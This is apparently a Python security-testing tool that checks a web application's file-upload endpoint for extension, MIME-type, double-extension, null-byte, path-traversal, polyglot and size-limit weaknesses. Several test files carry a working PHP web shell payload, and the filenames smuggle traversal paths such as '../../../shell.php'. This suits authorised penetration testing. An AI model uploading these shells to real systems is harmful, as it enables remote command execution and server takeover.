#!/usr/bin/env python3
"""
File Upload Security Tester

Tests file upload functionality for security vulnerabilities.
"""

import requests
import os
import tempfile
from typing import Dict, List, Optional, Any
from colorama import Fore, Style
from urllib.parse import urljoin


class FileUploadTester:
    """Tests file upload security"""
    
    def __init__(self, target_url: str, session: Optional[requests.Session] = None,
                 verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.session = session or requests.Session()
        self.verbose = verbose
        self.malicious_extensions = [
            '.php', '.jsp', '.asp', '.aspx', '.py', '.rb', '.pl',
            '.sh', '.bat', '.cmd', '.exe', '.scr', '.com'
        ]
        self.image_extensions = ['.jpg', '.png', '.gif', '.bmp', '.svg']
    
    def test_all_upload_vulnerabilities(self) -> Dict[str, Any]:
        """Test all file upload vulnerabilities"""
        results = {
            'extension_bypass': self.test_extension_bypass(),
            'mime_type_bypass': self.test_mime_type_bypass(),
            'double_extension': self.test_double_extension(),
            'null_byte_injection': self.test_null_byte_injection(),
            'path_traversal': self.test_path_traversal(),
            'polyglot_files': self.test_polyglot_files(),
            'size_limits': self.test_size_limits()
        }
        
        return results
    
    def test_extension_bypass(self) -> Dict[str, Any]:
        """Test extension filtering bypass"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing extension bypass...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        for ext in self.malicious_extensions:
            try:
                # Create test file
                with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as tmp_file:
                    tmp_file.write(b'<?php echo "test"; ?>')
                    tmp_file_path = tmp_file.name
                
                # Try to upload
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (f'test{ext}', f, 'application/octet-stream')}
                    response = self.session.post(upload_endpoint, files=files, timeout=10)
                
                # Check if upload was successful
                if response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'extension': ext,
                        'status_code': response.status_code,
                        'response': response.text[:200],
                        'severity': 'HIGH'
                    })
                
                # Cleanup
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing {ext}: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_mime_type_bypass(self) -> Dict[str, Any]:
        """Test MIME type filtering bypass"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing MIME type bypass...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        # Test malicious files with image MIME types
        mime_bypasses = [
            ('test.php', 'image/jpeg'),
            ('test.jsp', 'image/png'),
            ('test.asp', 'image/gif'),
            ('shell.php', 'text/plain')
        ]
        
        for filename, mime_type in mime_bypasses:
            try:
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(b'<?php system($_GET["cmd"]); ?>')
                    tmp_file_path = tmp_file.name
                
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (filename, f, mime_type)}
                    response = self.session.post(upload_endpoint, files=files, timeout=10)
                
                if response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'filename': filename,
                        'mime_type': mime_type,
                        'status_code': response.status_code,
                        'severity': 'HIGH'
                    })
                
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing MIME bypass: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_double_extension(self) -> Dict[str, Any]:
        """Test double extension bypass"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing double extension bypass...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        double_extensions = [
            'shell.php.jpg',
            'backdoor.asp.png',
            'test.jsp.gif',
            'malware.php.jpeg'
        ]
        
        for filename in double_extensions:
            try:
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(b'<?php phpinfo(); ?>')
                    tmp_file_path = tmp_file.name
                
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (filename, f, 'image/jpeg')}
                    response = self.session.post(upload_endpoint, files=files, timeout=10)
                
                if response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'filename': filename,
                        'status_code': response.status_code,
                        'severity': 'HIGH'
                    })
                
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing double extension: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_null_byte_injection(self) -> Dict[str, Any]:
        """Test null byte injection in filenames"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing null byte injection...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        null_byte_filenames = [
            'shell.php\x00.jpg',
            'backdoor.asp\x00.png',
            'test.jsp\x00.gif'
        ]
        
        for filename in null_byte_filenames:
            try:
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(b'<?php echo "null byte test"; ?>')
                    tmp_file_path = tmp_file.name
                
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (filename, f, 'image/jpeg')}
                    response = self.session.post(upload_endpoint, files=files, timeout=10)
                
                if response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'filename': filename.replace('\x00', '\\x00'),
                        'status_code': response.status_code,
                        'severity': 'HIGH'
                    })
                
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing null byte: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_path_traversal(self) -> Dict[str, Any]:
        """Test path traversal in file uploads"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing path traversal...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        traversal_filenames = [
            '../../../shell.php',
            '..\\..\\..\\backdoor.asp',
            '....//....//shell.php',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php'
        ]
        
        for filename in traversal_filenames:
            try:
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(b'<?php echo "path traversal test"; ?>')
                    tmp_file_path = tmp_file.name
                
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (filename, f, 'text/plain')}
                    response = self.session.post(upload_endpoint, files=files, timeout=10)
                
                if response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'filename': filename,
                        'status_code': response.status_code,
                        'severity': 'CRITICAL'
                    })
                
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing path traversal: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_polyglot_files(self) -> Dict[str, Any]:
        """Test polyglot file uploads"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing polyglot files...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        vulnerabilities = []
        
        # Create polyglot file (valid image + PHP code)
        polyglot_content = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13'
            b'<?php system($_GET["cmd"]); ?>'
        )
        
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                tmp_file.write(polyglot_content)
                tmp_file_path = tmp_file.name
            
            with open(tmp_file_path, 'rb') as f:
                files = {'file': ('polyglot.png', f, 'image/png')}
                response = self.session.post(upload_endpoint, files=files, timeout=10)
            
            if response.status_code in [200, 201]:
                vulnerabilities.append({
                    'type': 'polyglot_png_php',
                    'status_code': response.status_code,
                    'severity': 'HIGH'
                })
            
            os.unlink(tmp_file_path)
            
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] Error testing polyglot: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_size_limits(self) -> Dict[str, Any]:
        """Test file size limits"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing file size limits...{Style.RESET_ALL}")
        
        upload_endpoint = urljoin(self.target_url, '/uploads.json')
        size_tests = []
        
        # Test different file sizes
        test_sizes = [1024, 10240, 102400, 1048576, 10485760]  # 1KB to 10MB
        
        for size in test_sizes:
            try:
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(b'A' * size)
                    tmp_file_path = tmp_file.name
                
                with open(tmp_file_path, 'rb') as f:
                    files = {'file': (f'test_{size}.txt', f, 'text/plain')}
                    response = self.session.post(upload_endpoint, files=files, timeout=30)
                
                size_tests.append({
                    'size_bytes': size,
                    'size_mb': round(size / 1048576, 2),
                    'status_code': response.status_code,
                    'accepted': response.status_code in [200, 201]
                })
                
                os.unlink(tmp_file_path)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing size {size}: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'size_tests': size_tests
        }